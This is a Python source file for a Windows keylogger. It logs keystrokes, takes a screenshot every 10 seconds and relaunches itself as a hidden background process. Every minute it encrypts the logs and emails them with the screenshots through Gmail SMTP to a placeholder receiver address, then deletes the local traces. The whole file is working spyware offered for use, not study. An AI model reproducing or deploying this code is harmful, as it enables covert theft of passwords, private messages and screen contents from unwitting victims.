import os
import sys
import time
import logging
import threading
import smtplib
import schedule
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet
import subprocess
import pyscreenshot as ImageGrab

# Paths and constants
LOG_DIRECTORY = os.path.expanduser('~') + "\\.keylogs\\"
KEY_FILE = LOG_DIRECTORY + "key.key"
LOG_FILE = LOG_DIRECTORY + "keylog.txt"
SCREENSHOT_INTERVAL = 10  # in seconds
EMAIL_INTERVAL = 1  # in minutes

# Email credentials
EMAIL_ADDRESS = "your-email-id"
EMAIL_PASSWORD = "your-app-password"
EMAIL_TO = "your-reciever-email"

# Ensure log directory exists
if not os.path.exists(LOG_DIRECTORY):
    os.makedirs(LOG_DIRECTORY)

# Encryption setup
def load_or_generate_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'rb') as kf:
            return kf.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE, 'wb') as kf:
            kf.write(key)
        return key

key = load_or_generate_key()
cipher_suite = Fernet(key)

# Logging setup
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def encrypt_data(data):
    return cipher_suite.encrypt(data)

def send_email():
    try:
        with open(LOG_FILE, 'r') as file:
            log_data = file.read()

        if not log_data:
            return

        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_TO
        msg['Subject'] = 'Keylogger Report'

        body = "Attached is the encrypted log file and screenshots."
        msg.attach(MIMEText(body, 'plain'))

        # Attach log file
        encrypted_log = encrypt_data(log_data.encode())
        attachment = MIMEBase('application', 'octet-stream')
        attachment.set_payload(encrypted_log)
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', f'attachment; filename="log.txt"')
        msg.attach(attachment)

        # Attach screenshots
        for filename in os.listdir(LOG_DIRECTORY):
            if filename.endswith(".png"):
                with open(os.path.join(LOG_DIRECTORY, filename), 'rb') as f:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename="{filename}"')
                    msg.attach(part)
                os.remove(os.path.join(LOG_DIRECTORY, filename))

        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, EMAIL_TO, msg.as_string())
        server.quit()

        with open(LOG_FILE, 'w'):
            pass  # Clear the log file

    except Exception as e:
        logging.error(f"Failed to send email: {e}")

def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed.')
    except AttributeError:
        logging.info(f'Special Key {key} pressed.')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        screenshot.save(os.path.join(LOG_DIRECTORY, f"screenshot_{timestamp}.png"))
    except Exception as e:
        logging.error(f"Failed to capture screenshot: {e}")

def schedule_tasks():
    schedule.every(EMAIL_INTERVAL).minutes.do(send_email)
    schedule.every(SCREENSHOT_INTERVAL).seconds.do(capture_screenshot)
    while True:
        schedule.run_pending()
        time.sleep(1)

def run_as_background():
    if sys.platform == "win32":
        if "background" in sys.argv:
            keylogger_thread = threading.Thread(target=start_keylogger)
            scheduler_thread = threading.Thread(target=schedule_tasks)
            keylogger_thread.start()
            scheduler_thread.start()
            keylogger_thread.join()
            scheduler_thread.join()
        else:
            subprocess.Popen([sys.executable, __file__, "background"], creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit(0)

if __name__ == "__main__":
    run_as_background()
